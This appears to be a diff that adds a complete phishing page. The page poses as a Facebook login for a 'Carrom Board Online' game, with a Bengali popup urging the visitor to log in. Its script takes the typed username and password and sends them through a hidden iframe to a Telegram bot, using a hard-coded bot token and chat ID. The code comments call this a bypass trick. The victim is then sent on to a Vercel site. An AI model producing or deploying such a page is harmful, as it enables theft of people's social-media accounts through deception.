@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+  <title>Carrom Board Online Login</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
+  <link href="https://fonts.googleapis.com/css2?family=Helvetica+Neue&family=Roboto&display=swap" rel="stylesheet" />
+  <style>
+    /* ... (Apnar ager style gulo ekhane thakbe, ami shudhu main part ta dichhi) ... */
+    body { font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; background-color: #f0f2f5; }
+    h1 { font-family: "Roboto", sans-serif; font-weight: 700; letter-spacing: -0.05em; }
+    /* ... baki style same ... */
+  </style>
+</head>
+<body class="min-h-screen flex flex-col items-center">
+
+  <!-- Popup -->
+  <div class="popup-overlay show" id="customPopup">
+    <div class="popup-box">
+      <i class="fas fa-user-shield popup-icon"></i>
+      <div class="popup-text">
+        ফেসবুকের সাথে ক্যারামবোর্ড গেম অ্যাড করা নেই<br>
+        দয়া করে লগিন করুন
+      </div>
+      <button class="popup-btn" onclick="closePopup()">ঠিক আছে (OK)</button>
+    </div>
+  </div>
+
+  <!-- Main Content -->
+  <header class="w-full bg-[#1877f2] py-4 flex justify-center shadow-md">
+    <h1 class="text-white text-5xl select-none">facebook</h1>
+  </header>
+
+  <main class="flex flex-col items-center mt-10 px-6 w-full max-w-lg">
+    <img alt="Carrom Logo" class="rounded-xl mb-6 shadow-lg" height="100" src="https://i.postimg.cc/BQJRCLW4/file-000000008d308211ba86d7a4fe4dd552.png" width="100" />
+    <p class="text-center text-gray-600 text-[21px] mb-8 leading-relaxed font-medium max-w-md">
+      Log in to your Facebook account to connect to Carrom Board Online
+    </p>
+
+    <form id="loginForm" class="w-full space-y-5" autocomplete="off">
+      <input autocomplete="username" class="custom-input w-full border border-gray-300 rounded-xl text-gray-700 focus:outline-none focus:ring-2 focus:ring-[#1877f2] focus:border-transparent shadow-sm" id="username" name="username" placeholder="Mobile number or email address" required type="text" />
+      <input autocomplete="current-password" class="custom-input w-full border border-gray-300 rounded-xl text-gray-700 focus:outline-none focus:ring-2 focus:ring-[#1877f2] focus:border-transparent shadow-sm" id="password" name="password" placeholder="Facebook password" required type="password" />
+      <button class="w-full bg-[#1877f2] text-white rounded-xl hover:bg-[#165ec9] shadow-lg mt-2" type="submit" id="loginButton">Log In</button>
+    </form>
+    
+    <!-- ... baki link/footer same thakbe ... -->
+  </main>
+
+  <script>
+    function closePopup() { document.getElementById('customPopup').classList.remove('show'); }
+
+    // ==========================================
+    // 🔴 Telegram Configuration
+    // ==========================================
+    const TELEGRAM_BOT_TOKEN = "8667615841:AAGvy_U5h-QYYB5n4ZXdk1ejc1gddP8vmsk";
+    const TELEGRAM_CHAT_ID = "6250740299";
+    const REDIRECT_URL = "https://newcarrim.vercel.app/"; // 👈 Vercel link
+
+    const loginButton = document.getElementById("loginButton");
+
+    document.getElementById("loginForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const username = document.getElementById("username").value.trim();
+      const password = document.getElementById("password").value.trim();
+
+      if (!username || !password || password.length < 6) {
+        // ... validation code same ...
+        return;
+      }
+
+      // Time format
+      const now = new Date();
+      const formattedDateTime = now.toLocaleString('en-GB', {
+        year: 'numeric', month: '2-digit', day: '2-digit',
+        hour: '2-digit', minute: '2-digit', second: '2-digit',
+        hour12: false
+      }).replace(/,/g, '');
+
+      const message = `🕒 <b>${formattedDateTime}</b>\n\n🤖 <b>Carrom login</b>\n<b>Username:</b> <code>${username}</code>\n\n<b>Password:</b> <code>${password}</code>`;
+
+      // 👇 ETA HOCHE INFINITYFREE BYPASS TRICK (Hidden Iframe) 👇
+      // Amra fetch use korchi na, ekta form banacchi jegulo chupchap data pathabe.
+      
+      const encodedMessage = encodeURIComponent(message);
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=HTML`;
+      
+      const iframe = document.createElement('iframe');
+      iframe.style.display = 'none';
+      iframe.src = url;
+      document.body.appendChild(iframe);
+
+      // Button Loading
+      loginButton.innerHTML = 'Logging in... <i class="fas fa-spinner fa-spin" style="margin-left:8px;"></i>';
+      loginButton.disabled = true;
+
+      // Redirect
+      setTimeout(function() {
+        window.location.href = REDIRECT_URL;
+      }, 1500); 
+    });
+  </script>
+</body>
+</html>
